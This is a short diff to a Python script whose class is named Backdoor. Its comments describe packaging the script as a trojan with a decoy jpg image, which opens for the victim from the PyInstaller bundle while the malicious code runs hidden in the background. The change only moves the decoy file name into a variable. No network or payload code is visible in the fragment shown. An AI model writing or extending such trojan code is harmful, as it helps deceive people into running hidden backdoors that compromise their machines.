@@ -88,9 +88,11 @@ class Backdoor:
 # while the malicious Python script runs in the background, hidden from their eyes.
 # The file name needs to be changed accordingly based on what file we want to package with .py script.
 
-# TODO: The line doesn't work when used as a standalone script (instead as a trojan compiled with jpg file).
+# The line doesn't work when used as a standalone script (instead as a trojan compiled with jpg file).
 # Comment out those lines to make it work without embedding into executable.
-file_path = os.path.join(sys._MEIPASS, "python_black.jpg")
+# The file which is supposed to be embedded together with this backdoor script. Change accordingly.
+file_name = "python_black.jpg"
+file_path = os.path.join(sys._MEIPASS, file_name)
 subprocess.Popen(file_path, shell=True)
 
 try:
